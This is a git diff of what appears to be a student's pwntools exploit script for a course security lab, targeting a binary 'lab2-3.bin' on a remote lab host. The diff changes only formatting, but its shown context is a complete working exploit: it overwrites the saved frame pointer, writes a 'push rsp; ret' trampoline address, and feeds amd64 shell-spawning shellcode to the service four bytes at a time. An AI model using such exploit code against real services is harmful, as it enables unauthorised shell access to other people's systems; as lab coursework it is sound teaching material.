@@ -1,5 +1,6 @@
 from pwn import *
 
+
 def put_shellcode_on_stack(binary_code, exploitable_process):
     # This function is designed to read shellcode and push it onto the stack.
     # Because the victim program only accepts string representations of integers (4 bytes),
@@ -18,17 +19,17 @@ def put_shellcode_on_stack(binary_code, exploitable_process):
         exploitable_process.sendlineafter(b"number:", str(code_as_int).encode())
 
         # I check if there are any remaining bytes to read.
-        if binary_code[4] != b'':
+        if binary_code[4] != b"":
             # If there are, I call the function again to read the remaining portion.
             put_shellcode_on_stack(binary_code[4:], exploitable_process)
     except IndexError:
         return
     return
 
-if __name__ == "__main__":
 
+if __name__ == "__main__":
     # Declaring some variables that will be used later.
-    local_binary_file = "./lab2-3.bin"
+    local_binary_file = "./dsu-provided-files/lab2-3.bin"
     remote_server = "csc748.hostbin.org"
     remote_port = 7023
 
@@ -39,14 +40,14 @@ if __name__ == "__main__":
     context.arch = "amd64"
     shellcode = shellcraft.amd64.linux.sh()
 
-    # In order to execute my shellcode after I push it onto the stack, 
+    # In order to execute my shellcode after I push it onto the stack,
     # I need to jump back to the stack.
     # Using 'ropper -f lab2-3.bin -j rsp', I was able to locate the command 'push rsp, ret' in the victim code.
     # The address of these instructions is 0x4013d6, so I save them for later use.
-    trampoline_address = 0x4013d6
+    trampoline_address = 0x4013D6
 
     #### EXPLOITATION ####
-    
+
     # I can now run the process. The following lines are various forms for different purposes.
     process_to_exploit = remote(remote_server, remote_port)
     # process_to_exploit = process(local_binary_file)
@@ -59,14 +60,14 @@ if __name__ == "__main__":
         process_to_exploit.sendlineafter(b"number:", b"" + str(counter).encode())
 
     # Once I have overwritten rbp, I can drop the trampoline address onto the stack.
-    # Because the input only reads in 32-bits at a time, I need to add extra zeros to 
+    # Because the input only reads in 32-bits at a time, I need to add extra zeros to
     # ensure the full 64-bit address is correct on the stack.
     process_to_exploit.sendlineafter(b"number:", str(trampoline_address).encode())
     process_to_exploit.sendlineafter(b"number:", b"0")
 
-    # Now, I'm ready to send in the shellcode. 
-    # As mentioned, I can only send in 32-bits at a time. 
-    # So, I have to break the code up. 
+    # Now, I'm ready to send in the shellcode.
+    # As mentioned, I can only send in 32-bits at a time.
+    # So, I have to break the code up.
     # See the function above for an explanation of how and why I chose to handle that problem.
     machine_code = asm(shellcode)
     put_shellcode_on_stack(machine_code, process_to_exploit)
